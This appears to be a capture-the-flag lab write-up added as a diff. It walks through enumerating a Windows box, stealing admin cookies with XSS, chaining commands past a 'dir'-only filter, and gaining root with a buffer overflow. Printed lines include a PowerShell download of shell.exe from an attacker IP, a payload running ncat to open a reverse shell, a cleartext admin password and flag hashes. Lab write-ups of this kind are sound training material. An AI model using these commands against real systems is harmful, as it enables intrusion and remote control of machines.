@@ -1,0 +1,27 @@
+Runing the nmap scripts we get 4 ports open: 80 ( Web ), 443 ( SSL ) , 445 ( SAMBA ) and 3306 ( MYSQL )
+
+Attacking the web ( port 80 )
+We get a bitcoin transfer wallet with which we can create an account. Let's use test:test. 
+When we are logged in we get a transfer form, to send money from one use to another. But when we proceed with that transfer an interesting message pops up `Transfer on hold. An admin will review it within a minute.` I wonder if we can XSS and steal the admin credentials. 
+Let's try to exploit that form. Inject the payload from `admin.cookie` in all the possible fields and than wait for the response.
+And we got the first set of credentials.
+
+Attacking the backendchecker ( port 80 )
+Well, as an admin we have access to a backend door checker, but we can only do `dir` cmd over localhost. When we try stuff like `dir & whoami` it doesn't give the error with "The only cmd that you can use" so we can pass multiple things against this.
+Using the idea from the first part of the exploit, we get an XSS RCE working and got the user shell.
+
+Heading to root.
+We see that `bankv2` is running on the box and we also have the `bankv2.exe`. Let's try and download it.
+Switch to metasploit using `(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.47:8000/shell.exe", "C:\Users\Cortin\Desktop\shell.exe")` to download the payload. 
+It seems we can't download this file. Looking over the listeners, using `netstat -an` port 910 is open only for local. Let's portforword it `portfwd add -l 910 -r 10.10.10.154 -p 910` and than connect using `telnet localhost 910`
+Bruteforce it using `bruteforce.py` and the the pin 0021  
+Overflow it with `0000000000000000000000000000testC:\\Users\Cortin\Desktop\ncat.exe 10.10.14.47 1337 -e cmd.exe` ( 32 characters for overflow and than the command that you should execute ).
+
+Rooted. 
+
+Users:
+-> admin:Hopelessromantic ( web )
+
+Flags:
+-> User: f635346600876a43441cf1c6e94769ac
+-> Root: aa65d8e6216585ea636eb07d4a59b197
